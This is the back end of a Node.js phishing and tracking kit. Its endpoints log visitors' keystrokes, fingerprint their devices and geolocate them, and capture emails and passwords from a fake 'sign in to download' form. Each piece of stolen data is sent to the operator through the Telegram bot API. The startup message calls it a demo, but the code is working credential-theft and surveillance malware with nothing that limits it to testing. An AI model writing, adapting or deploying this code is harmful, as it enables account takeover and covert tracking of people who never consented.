const express = require("express");
const path = require("path");
const http = require("http");
const https = require("https");
const crypto = require("crypto");
const fs = require("fs");

// ── Config: env vars first, then config.json ──────────────────────────
let CONFIG = {};
try {
  CONFIG = JSON.parse(fs.readFileSync(path.join(__dirname, "config.json"), "utf8"));
} catch (e) { /* config.json optional */ }

const BOT_TOKEN = process.env.BOT_TOKEN || CONFIG.bot_token;
const CHAT_ID = process.env.CHAT_ID || CONFIG.chat_id;
const PORT = process.env.PORT || 3000;

if (!BOT_TOKEN || !CHAT_ID) {
  console.error("\n[!] Missing Telegram config.");
  console.error("    Create config.json in this folder:");
  console.error('    { "bot_token": "123456:ABC...", "chat_id": "987654321" }\n');
  process.exit(1);
}

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// ── Helper: send a styled message to Telegram ─────────────────────────
function tgSend(html) {
  const payload = JSON.stringify({
    chat_id: CHAT_ID,
    text: html,
    parse_mode: "HTML",
  });

  const req = https.request(
    {
      hostname: "api.telegram.org",
      path: `/bot${BOT_TOKEN}/sendMessage`,
      method: "POST",
      headers: { "Content-Type": "application/json" },
    },
    (res) => {
      let body = "";
      res.on("data", (c) => (body += c));
      res.on("end", () => {
        if (res.statusCode !== 200) {
          console.error(`[tg] ${res.statusCode}: ${body}`);
        }
      });
    }
  );
  req.on("error", (e) => console.error("[tg] send failed:", e.message));
  req.write(payload);
  req.end();
}

// ── Helper: get real client IP (behind Render/Vercel proxy) ───────────
function clientIp(req) {
  const fwd = req.headers["x-forwarded-for"];
  if (fwd) return fwd.split(",")[0].trim();
  return req.socket.remoteAddress || "unknown";
}

// ── Helper: IP geolocation (ip-api free, no key) ───────────────────────
function geoLookup(ip) {
  // Private/local IPs (testing on localhost) — skip the lookup
  if (
    ip === "unknown" ||
    ip.startsWith("127.") ||
    ip.startsWith("10.") ||
    ip.startsWith("192.168.") ||
    ip.startsWith("::1") ||
    ip.startsWith("172.16.") || ip.startsWith("172.17.") ||
    ip.startsWith("172.18.") || ip.startsWith("172.19.") ||
    ip.startsWith("172.2") || ip.startsWith("172.30.") || ip.startsWith("172.31.")
  ) {
    return Promise.resolve(null);
  }

  return new Promise((resolve) => {
    const req = http.get(
      { hostname: "ip-api.com", path: `/json/${ip}?fields=status,country,regionName,city,isp,timezone`, timeout: 4000 },
      (res) => {
        let body = "";
        res.on("data", (c) => (body += c));
        res.on("end", () => {
          try {
            const d = JSON.parse(body);
            resolve(d.status === "success" ? d : null);
          } catch (e) {
            resolve(null);
          }
        });
      }
    );
    req.on("error", () => resolve(null));
    req.on("timeout", () => { req.destroy(); resolve(null); });
  });
}

const esc = (s) => String(s || "?").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");

// ── Endpoint: new visitor dossier ──────────────────────────────────────
app.post("/collect", async (req, res) => {
  const ip = clientIp(req);
  const seen = crypto.createHash("sha256").update(ip + "|" + (req.body.platform || "") + (req.body.screen || "")).digest("hex").slice(0, 12);
  const d = req.body || {};
  const geo = await geoLookup(ip);
  const now = new Date().toLocaleTimeString("en-IN", { hour12: false });

  let msg = `🎯 <b>NEW VISITOR @ ${esc(now)}</b>\n`;
  msg += `─────────────────────\n`;
  msg += `📱 <b>Device:</b> ${esc(d.platform)}\n`;
  msg += `🖥️ <b>Browser:</b> ${esc(d.browser)}\n`;
  msg += `🌐 <b>Language:</b> ${esc(d.language)}\n`;
  msg += `🖥️ <b>Screen:</b> ${esc(d.screen)}${d.darkMode ? " (dark mode)" : ""}\n`;
  msg += `⏰ <b>Local time:</b> ${esc(d.localTime)}\n`;

  if (d.battery) {
    msg += `🔋 <b>Battery:</b> ${d.battery.level}%${d.battery.charging ? " (charging)" : " (discharging)"}\n`;
  }
  if (d.connection) {
    msg += `📶 <b>Network:</b> ${esc(d.connection.effectiveType)}${d.connection.saveData ? " (data saver on)" : ""}\n`;
  }
  if (d.cores) msg += `⚙️ <b>CPU cores:</b> ${esc(d.cores)} | RAM: ${esc(d.memory || "?")}GB\n`;
  if (d.timezone) msg += `🕐 <b>Timezone:</b> ${esc(d.timezone)}\n`;
  if (d.touchSupport) msg += `👆 <b>Touch screen:</b> yes (${esc(d.maxTouchPoints)} points)\n`;
  if (d.gpu) msg += `🎮 <b>GPU:</b> ${esc(d.gpu)}\n`;
  if (d.audioFingerprint) msg += `🔊 <b>Audio stack:</b> <code>${esc(d.audioFingerprint)}</code>\n`;
  if (d.webglHash) msg += `🧬 <b>Device fingerprint hash:</b> <code>${esc(d.webglHash)}</code>\n`;
  if (d.plugins && d.plugins.length) msg += `🧩 <b>Plugins:</b> ${esc(d.plugins.join(", "))}\n`;
  if (d.referrer) msg += `↩️ <b>Arrived from:</b> ${esc(d.referrer)}\n`;
  if (d.notifications && d.notifications.permission !== "default") msg += `🔔 <b>Notifications:</b> ${esc(d.notifications.permission)}\n`;

  msg += `🌍 <b>IP:</b> <code>${esc(ip)}</code>\n`;
  msg += `🆔 <b>Visitor ID:</b> <code>${esc(seen)}</code>\n`;

  if (geo) {
    msg += `📍 <b>Location:</b> ${esc(geo.city)}, ${esc(geo.regionName)} (${esc(geo.country)})\n`;
    msg += `📡 <b>ISP:</b> ${esc(geo.isp)}\n`;
    msg += `🕐 <b>IP timezone:</b> ${esc(geo.timezone)}\n`;
  } else if (ip.startsWith("127.") || ip.startsWith("192.168.") || ip.startsWith("::1")) {
    msg += `📍 <b>Location:</b> local network (testing mode)\n`;
  }

  tgSend(msg);
  res.json({ ok: true });
});

// ── Endpoint: keystrokes ───────────────────────────────────────────────
app.post("/keys", (req, res) => {
  const keys = String(req.body.keys || "").slice(0, 2000);
  if (!keys) return res.json({ ok: true });

  const context = req.body.context ? ` <i>[${esc(req.body.context)}]</i>` : "";
  tgSend(`⌨️ <b>KEYSTROKES</b>${context}\n<code>${esc(keys)}</code>`);
  res.json({ ok: true });
});

// ── Endpoint: form submission (fake "sign in to download") ────────────
app.post("/creds", (req, res) => {
  const { email, password } = req.body || {};
  if (!email && !password) return res.json({ ok: true });

  tgSend(
    `🔐 <b>CREDENTIALS CAPTURED</b>\n` +
    `👤 <b>Email:</b> <code>${esc(email)}</code>\n` +
    `🔑 <b>Password:</b> <code>${esc(password)}</code>`
  );
  res.json({ ok: true });
});

app.listen(PORT, () => {
  console.log(`\n[+] Demo server running on http://localhost:${PORT}`);
  console.log(`[+] Telegram relaying to chat_id: ${CHAT_ID}`);
  console.log(`[+] Open the page, tap keys — watch Telegram.\n`);
});
